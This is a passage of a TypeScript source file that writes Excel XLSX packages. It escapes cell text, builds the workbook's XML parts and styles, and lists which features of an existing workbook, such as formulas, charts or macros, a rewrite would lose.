 * `_xHHHH_`, and any literal `_xHHHH_` in the text escaped (as `_x005F_xHHHH_`) so Excel doesn't
 * decode it into a character the text never had.
 */
function escapeCellText(text: string): string {
  const normalized = text.replace(/\r\n?/g, "\n").replace(/[\ud800-\udbff](?![\udc00-\udfff])|(?<![\ud800-\udbff])[\udc00-\udfff]/g, "\ufffd");
  return escapeAttribute(normalized
    .replace(/_(x[0-9a-fA-F]{4}_)/g, "_x005F_$1")
    // oxlint-disable-next-line no-control-regex -- characters XML can't hold, escaped as Excel does
    .replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\ufffe\uffff]/g, char => `_x${char.charCodeAt(0).toString(16).toUpperCase().padStart(4, "0")}_`));
}

// -- package parts ------------------------------------------------------------------------------

const NS = {
  main: "http://schemas.openxmlformats.org/spreadsheetml/2006/main",
  relationships: "http://schemas.openxmlformats.org/officeDocument/2006/relationships",
  packageRelationships: "http://schemas.openxmlformats.org/package/2006/relationships",
  contentTypes: "http://schemas.openxmlformats.org/package/2006/content-types",
  officeRel: "http://schemas.openxmlformats.org/officeDocument/2006/relationships",
} as const;

const ROOT_RELS = XML_DECLARATION +
  `<Relationships xmlns="${NS.packageRelationships}">` +
  `<Relationship Id="rId1" Type="${NS.officeRel}/officeDocument" Target="xl/workbook.xml"/>` +
  `<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>` +
  `<Relationship Id="rId3" Type="${NS.officeRel}/extended-properties" Target="docProps/app.xml"/>` +
  `</Relationships>`;

function contentTypes(sheetCount: number, dynamic: boolean): string {
  const sheets = Array.from({ length: sheetCount }, (_, index) =>
    `<Override PartName="/xl/worksheets/sheet${index + 1}.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>`).join("");
  return XML_DECLARATION +
    `<Types xmlns="${NS.contentTypes}">` +
    `<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>` +
    `<Default Extension="xml" ContentType="application/xml"/>` +
    `<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>` +
    sheets +
    `<Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/>` +
    `<Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>` +
    (dynamic ? `<Override PartName="/xl/metadata.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheetMetadata+xml"/>` : "") +
    `<Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>` +
    `<Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/>` +
    `</Types>`;
}

function workbookXml(names: readonly string[], definedNames: readonly string[]): string {
  return XML_DECLARATION +
    `<workbook xmlns="${NS.main}" xmlns:r="${NS.relationships}">` +
    `<workbookPr defaultThemeVersion="164011"/>` +
    `<bookViews><workbookView xWindow="0" yWindow="0" windowWidth="28800" windowHeight="12300" activeTab="0"/></bookViews>` +
    `<sheets>${names.map((name, index) => `<sheet name="${escapeAttribute(name)}" sheetId="${index + 1}" r:id="rId${index + 1}"/>`).join("")}</sheets>` +
    (definedNames.length > 0 ? `<definedNames>${definedNames.join("")}</definedNames>` : "") +
    // Formulas are written without cached values, so Excel calculates everything when the file opens.
    `<calcPr calcId="191029" fullCalcOnLoad="1"/>` +
    `</workbook>`;
}

function workbookRels(sheetCount: number, dynamic: boolean): string {
  const sheets = Array.from({ length: sheetCount }, (_, index) =>
    `<Relationship Id="rId${index + 1}" Type="${NS.officeRel}/worksheet" Target="worksheets/sheet${index + 1}.xml"/>`).join("");
  return XML_DECLARATION +
    `<Relationships xmlns="${NS.packageRelationships}">` + sheets +
    `<Relationship Id="rId${sheetCount + 1}" Type="${NS.officeRel}/styles" Target="styles.xml"/>` +
    `<Relationship Id="rId${sheetCount + 2}" Type="${NS.officeRel}/sharedStrings" Target="sharedStrings.xml"/>` +
    (dynamic ? `<Relationship Id="rId${sheetCount + 3}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sheetMetadata" Target="metadata.xml"/>` : "") +
    `</Relationships>`;
}

function coreProperties(options: XlsxOptions, modifiedAt: Date): string {
  const at = isoSeconds(modifiedAt);
  return XML_DECLARATION +
    `<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" ` +
    `xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" ` +
    `xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">` +
    (options.title ? `<dc:title>${escapeAttribute(options.title)}</dc:title>` : "") +
    (options.author ? `<dc:creator>${escapeAttribute(options.author)}</dc:creator><cp:lastModifiedBy>${escapeAttribute(options.author)}</cp:lastModifiedBy>` : "") +
    `<dcterms:created xsi:type="dcterms:W3CDTF">${at}</dcterms:created>` +
    `<dcterms:modified xsi:type="dcterms:W3CDTF">${at}</dcterms:modified>` +
    `</cp:coreProperties>`;
}

function appProperties(names: readonly string[]): string {
  return XML_DECLARATION +
    `<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" ` +
    `xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">` +
    `<Application>Microsoft Excel</Application><DocSecurity>0</DocSecurity><ScaleCrop>false</ScaleCrop>` +
    `<HeadingPairs><vt:vector size="2" baseType="variant"><vt:variant><vt:lpstr>Worksheets</vt:lpstr></vt:variant>` +
    `<vt:variant><vt:i4>${names.length}</vt:i4></vt:variant></vt:vector></HeadingPairs>` +
    `<TitlesOfParts><vt:vector size="${names.length}" baseType="lpstr">${names.map(name => `<vt:lpstr>${escapeAttribute(name)}</vt:lpstr>`).join("")}</vt:vector></TitlesOfParts>` +
    `<LinksUpToDate>false</LinksUpToDate><SharedDoc>false</SharedDoc><HyperlinksChanged>false</HyperlinksChanged><AppVersion>16.0300</AppVersion>` +
    `</Properties>`;
}

/**
 * The styles: Aptos Narrow 11 (Excel's default font since 2023); a header that is bold on a light
 * fill with a rule beneath; `#,##0.00` for columns of two-decimal amounts; and wrapped, top-aligned
 * text for cells with line breaks. The order of `cellXfs` is `STYLE`.
 */
const STYLES = XML_DECLARATION +
  `<styleSheet xmlns="${NS.main}">` +
  `<fonts count="2">` +
  `<font><sz val="11"/><color theme="1"/><name val="Aptos Narrow"/><family val="2"/></font>` +
  `<font><b/><sz val="11"/><color theme="1"/><name val="Aptos Narrow"/><family val="2"/></font>` +
  `</fonts>` +
  `<fills count="3">` +
  `<fill><patternFill patternType="none"/></fill>` +
  `<fill><patternFill patternType="gray125"/></fill>` +
  `<fill><patternFill patternType="solid"><fgColor rgb="FFF2F2F2"/><bgColor indexed="64"/></patternFill></fill>` +
  `</fills>` +
  `<borders count="2">` +
  `<border><left/><right/><top/><bottom/><diagonal/></border>` +
  `<border><left/><right/><top/><bottom style="thin"><color rgb="FFA6A6A6"/></bottom><diagonal/></border>` +
  `</borders>` +
  `<cellStyleXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/></cellStyleXfs>` +
  `<cellXfs count="4">` +
  `<xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/>` +
  `<xf numFmtId="0" fontId="1" fillId="2" borderId="1" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1"><alignment vertical="center" wrapText="1"/></xf>` +
  `<xf numFmtId="4" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1"/>` +
  `<xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1"><alignment vertical="top" wrapText="1"/></xf>` +
  `</cellXfs>` +
  `<cellStyles count="1"><cellStyle name="Normal" xfId="0" builtinId="0"/></cellStyles>` +
  `<dxfs count="0"/><tableStyles count="0" defaultTableStyle="TableStyleMedium2" defaultPivotStyle="PivotStyleLight16"/>` +
  `</styleSheet>`;

/** Excel's dynamic-array cell metadata, which `cm="1"` on a formula cell points at. */
const DYNAMIC_ARRAY_METADATA = XML_DECLARATION +
  `<metadata xmlns="${NS.main}" xmlns:xda="http://schemas.microsoft.com/office/spreadsheetml/2017/dynamicarray">` +
  `<metadataTypes count="1"><metadataType name="XLDAPR" minSupportedVersion="120000" copy="1" pasteAll="1" pasteValues="1" merge="1" splitFirst="1" rowColShift="1" clearFormats="1" clearComments="1" assign="1" coerce="1" cellMeta="1"/></metadataTypes>` +
  `<futureMetadata name="XLDAPR" count="1"><bk><extLst><ext uri="{bdbb8cdc-fa1e-496e-a857-3c3f30c029c3}"><xda:dynamicArrayProperties fDynamic="1" fCollapsed="0"/></ext></extLst></bk></futureMetadata>` +
  `<cellMetadata count="1"><bk><rc t="1" v="0"/></bk></cellMetadata>` +
  `</metadata>`;

// -- what a rewrite would lose ------------------------------------------------------------------

const READ_NAMESPACES = {
  [NS.main]: "s",
  [NS.relationships]: "r",
  [NS.packageRelationships]: "pr",
} as const;

/**
 * What an existing workbook has that rewriting it from rows would lose, in words for an approver:
 * "2 other sheets", "formulas", "charts" and so on. Empty when nothing would be lost but values.
 */
export async function xlsxFeatures(bytes: Uint8Array): Promise<string[]> {
  const zip = openZip(bytes);
  const names = zip.entries().map(entry => entry.name.toLowerCase());
  const has = (prefix: string) => names.some(name => name.startsWith(prefix));
  const features: string[] = [];

  const workbook = zip.has("xl/workbook.xml") ? parseXml(await zip.readText("xl/workbook.xml"), { namespaces: READ_NAMESPACES }) : undefined;
  const sheetCount = childElements(firstChild(workbook, "s:sheets"), "s:sheet").length;
  if (sheetCount > 1) features.push(`${sheetCount - 1} other sheet${sheetCount === 2 ? "" : "s"}`);

  const worksheets = names.filter(name => /^xl\/worksheets\/[^/]+\.xml$/.test(name));
  // One at a time: the archive's inflation budget is shared, and only reads in sequence count against it.
  const sheetTexts: string[] = [];
  for (const name of worksheets) sheetTexts.push(await zip.readText(name));
  const anySheet = (pattern: RegExp) => sheetTexts.some(text => pattern.test(text));

  if (anySheet(/<(?:\w+:)?f[\s>/]/)) features.push("formulas");
  if (has("xl/charts/") || has("xl/chartsheets/")) features.push("charts");
  if (has("xl/pivottables/") || has("xl/pivotcache/")) features.push("pivot tables");
  if (has("xl/tables/")) features.push("tables");
  if (anySheet(/<(?:\w+:)?conditionalFormatting[\s>]/)) features.push("conditional formatting");
  if (anySheet(/<(?:\w+:)?dataValidations?[\s>]/)) features.push("data validation");
  if (names.some(name => /^xl\/(?:comments|threadedcomments\/)/.test(name))) features.push("comments");
  if (has("xl/media/") || has("xl/drawings/") && !has("xl/charts/")) features.push("images");
  if (names.includes("xl/vbaproject.bin")) features.push("macros");
  if (anySheet(/<(?:\w+:)?mergeCells[\s>]/)) features.push("merged cells");
  if (anySheet(/<(?:\w+:)?hyperlinks[\s>]/)) features.push("hyperlinks");
  if (anySheet(/<(?:\w+:)?sheetProtection[\s>]/) || /<(?:\w+:)?workbookProtection[\s>]/.test(workbook ? await zip.readText("xl/workbook.xml") : "")) features.push("protection");
  if (has("xl/externallinks/")) features.push("links to other workbooks");
  if (has("xl/connections.xml") || has("xl/querytables/") || has("customxml/")) features.push("data connections");

  const definedNames = childElements(firstChild(workbook, "s:definedNames"), "s:definedName")
    .filter(element => !/^_xlnm\./i.test(attribute(element, "name") ?? ""));
  if (definedNames.length > 0) features.push("named ranges");

  if (await hasOwnFormatting(zip)) features.push("cell formatting");
  return features;
}

/**
 * Whether the styles part defines formatting beyond what this writer emits for any workbook (its
 * header, two-decimal amounts and wrapped text), so a rewrite would lose someone's own formatting.
 */
async function hasOwnFormatting(zip: ZipArchive): Promise<boolean> {
  if (!zip.has("xl/styles.xml")) return false;
  const styles = parseXml(await zip.readText("xl/styles.xml"), { namespaces: READ_NAMESPACES });
  const count = (container: string, item: string) => childElements(firstChild(styles, container), item).length;
  if (count("s:numFmts", "s:numFmt") > 0) return true;
  const xfs = childElements(firstChild(styles, "s:cellXfs"), "s:xf");
  if (xfs.length > 4 || count("s:fonts", "s:font") > 2 || count("s:fills", "s:fill") > 3 || count("s:borders", "s:border") > 2) return true;
  // Within those bounds, anything not exactly this writer's own styles is someone else's formatting.
  return !xfs.every((xf, index) => sameXf(xf, index));
}

function sameXf(xf: XmlElement, index: number): boolean {
  const expected = [
    { numFmtId: "0", fontId: "0", fillId: "0", borderId: "0" },
    { numFmtId: "0", fontId: "1", fillId: "2", borderId: "1" },
    { numFmtId: "4", fontId: "0", fillId: "0", borderId: "0" },
    { numFmtId: "0", fontId: "0", fillId: "0", borderId: "0" },
  ][index];
  if (!expected) return false;
  return Object.entries(expected).every(([key, value]) => (attribute(xf, key) ?? "0") === value);
}
